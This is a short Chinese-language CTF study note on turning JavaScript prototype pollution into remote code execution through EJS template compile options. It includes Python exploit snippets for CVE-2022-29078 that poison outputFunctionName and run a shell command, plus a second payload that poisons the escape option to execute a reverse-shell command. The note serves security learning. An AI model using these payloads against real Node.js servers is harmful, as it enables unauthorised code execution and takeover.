tags:: CTFWEB/JS/原型链污染, CTFWEB/NodeJS/EJS, CTFWEB/NodeJS

- > 原型链污染+EJS=RCE
- # 原理
	- ejs在编译模板时会将选项中的某些项直接拼接到编译结果中执行，而选项是存储在一个对象中的，我们只需要污染这些属性即可
	- 即使没有原型链污染也可以在express中的`res.render('xxx', {options...})`处直接传入这些选项进行RCE
- # outputFunctionName
	- CVE-2022-29078
	- ```python
	  r = base_post(url, headers = headers, json = {
	      "__proto__": {
	          "outputFunctionName": "a=1;return global.process.mainModule.constructor._load('child_process').execSync('bash -c \"sleep 3; env\"');//"
	      }
	  })
	  print(r.text)
	  ```
- # escape
	- 参考：
		- 我是在做[这题](((654dda41-c3ee-4d76-b945-69080bd6539a)))的时候挖出来的。。。
		- [别人的文章](https://www.inhann.top/2023/03/26/ejs/)
	- 原理和`outputFunctionName`是一样的，payload都会被拼接到编译产物中
	- 貌似也可以用`escapeFunction`?
	- 让client为真，并传入payload即可
		- ```python
		  ejs_escape = """\
		  function escapeXMLToString114() {
		    return Function.prototype.toString.call(this) + ';\\n' + escapeFuncStr;
		  }
		  console.log('114514ejs');
		  process.mainModule.require('child_process').execSync(CMD);
		  \
		  """.replace("CMD", repr(reverse_shell_payload))
		  r = base_post(
		      url + "/create",
		      json={ # 这里的对象需要被传入到proto中
		          "name": "global",
		          "settings": {
		              "view options": {
		                  "client": "1",
		                  "escape": ejs_escape,
		              }
		          }
		      },
		  )
		  print(r.text)
		  ```
- # 其他
	- [参考](https://xz.aliyun.com/t/13544)
-